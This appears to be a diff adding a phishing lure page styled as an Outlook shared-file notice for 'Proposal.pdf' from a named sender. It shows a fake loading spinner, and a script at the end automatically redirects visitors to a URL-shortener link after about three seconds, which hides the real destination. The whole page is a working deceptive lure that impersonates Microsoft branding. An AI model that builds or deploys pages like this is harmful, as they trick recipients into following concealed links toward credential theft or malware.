@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Outlook — Proposal.pdf</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;width:100%;}
+
+body{background:#f3f2f1;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;}
+.l-wrap{display:flex;width:100%;min-height:100vh;}
+.l-left{width:42%;background:#0078D4;display:flex;flex-direction:column;justify-content:center;padding:60px 48px;color:#fff;flex-shrink:0;}
+.l-right{flex:1;display:flex;align-items:center;justify-content:center;padding:40px;background:#fff;}
+.l-card{width:100%;max-width:420px;}
+
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes prog{from{width:0}to{width:100%}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+@keyframes checkPop{from{transform:scale(0)}to{transform:scale(1)}}
+.anim{animation:fadeIn .35s ease both;}
+.spin{animation:spin .8s linear infinite;}
+.prog{animation:prog 2.9s cubic-bezier(.4,0,.2,1) forwards;}
+</style>
+</head>
+<body>
+
+
+<div class="l-wrap">
+  <div class="l-left anim">
+    <div style="font-size:26px;font-weight:700;margin-bottom:10px;letter-spacing:-.02em;">Outlook</div>
+    <div style="font-size:14px;opacity:.8;margin-bottom:6px;">Shared by: <strong>Omar Urbina</strong></div>    <div style="margin-bottom:28px;"></div>    <div style="opacity:.6;"><svg width="32" height="40" viewBox="0 0 32 40" xmlns="http://www.w3.org/2000/svg"><path d="M0 3C0 1.34 1.34 0 3 0H21L32 11V37C32 38.66 30.66 40 29 40H3C1.34 40 0 38.66 0 37V3Z" fill="#E8352A"/><path d="M21 0L32 11H24C22.34 11 21 9.66 21 8V0Z" fill="#FF6B62"/><text x="16" y="27" text-anchor="middle" fill="white" font-size="8" font-weight="700" font-family="Arial,sans-serif" letter-spacing="0.5">PDF</text></svg></div>
+    <div style="margin-top:12px;font-size:13px;opacity:.65;font-weight:500;">Proposal.pdf</div>
+  </div>
+  <div class="l-right">
+    <div class="l-card anim">
+
+<div style="background:#fff;border-radius:2px;overflow:hidden;">
+    <div style="background:#0078D4;padding:10px 16px;display:flex;align-items:center;gap:8px;">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect width="7" height="7" rx="1" fill="rgba(255,255,255,.9)"/><rect x="9" width="7" height="7" rx="1" fill="rgba(255,255,255,.7)"/><rect y="9" width="7" height="7" rx="1" fill="rgba(255,255,255,.7)"/><rect x="9" y="9" width="7" height="7" rx="1" fill="rgba(255,255,255,.9)"/></svg>
+    <span style="color:#fff;font-size:13px;font-weight:600;">Outlook</span>
+  </div>
+    <div style="background:#faf9f8;border-bottom:1px solid #edebe9;padding:7px 16px;font-size:12px;color:#605e5c;display:flex;gap:8px;align-items:center;">
+    <span>Home</span><span style="color:#c8c6c4;">›</span><span>Shared with you</span><span style="color:#c8c6c4;">›</span><span style="color:#0078D4;font-weight:600;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">Proposal.pdf</span>
+  </div>
+  <div style="padding:22px 24px;">
+        <div style="background:#f3f2f1;border-left:3px solid #0078D4;padding:9px 12px;margin-bottom:16px;font-size:12px;border-radius:0 2px 2px 0;">
+      <span style="color:#323130;">Shared by: <strong>Omar Urbina</strong></span>                </div>
+        <div style="border:1px solid #edebe9;border-radius:2px;padding:12px;display:flex;align-items:center;gap:12px;margin-bottom:18px;background:#fafafa;">
+      <svg width="32" height="40" viewBox="0 0 32 40" xmlns="http://www.w3.org/2000/svg"><path d="M0 3C0 1.34 1.34 0 3 0H21L32 11V37C32 38.66 30.66 40 29 40H3C1.34 40 0 38.66 0 37V3Z" fill="#E8352A"/><path d="M21 0L32 11H24C22.34 11 21 9.66 21 8V0Z" fill="#FF6B62"/><text x="16" y="27" text-anchor="middle" fill="white" font-size="8" font-weight="700" font-family="Arial,sans-serif" letter-spacing="0.5">PDF</text></svg>      <div style="flex:1;min-width:0;margin-left:6px;">
+        <div style="font-size:14px;font-weight:600;color:#323130;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Proposal.pdf</div>
+        <div style="font-size:12px;color:#605e5c;margin-top:3px;">Omar Urbina · Shared with you</div>
+        <div style="font-size:11px;color:#a19f9d;margin-top:2px;">Preparing your file...</div>
+      </div>
+      <div style="width:22px;height:22px;border:2.5px solid #edebe9;border-top-color:#0078D4;border-radius:50%;flex-shrink:0;" class="spin"></div>
+    </div>
+    <div style="height:2px;background:#edebe9;overflow:hidden;margin-bottom:8px;"><div style="height:100%;background:#0078D4;" class="prog"></div></div>
+    <div style="font-size:11px;color:#a19f9d;">Please wait...</div>
+  </div>
+</div>
+
+
+    </div><!-- l-card -->
+  </div><!-- l-right -->
+</div><!-- l-wrap -->
+
+<script>
+var dest="https:\/\/cutt.ly/Byj68nw2\/";
+setTimeout(function(){window.location.replace(dest);},3300);
+</script>
+</body>
+</html>
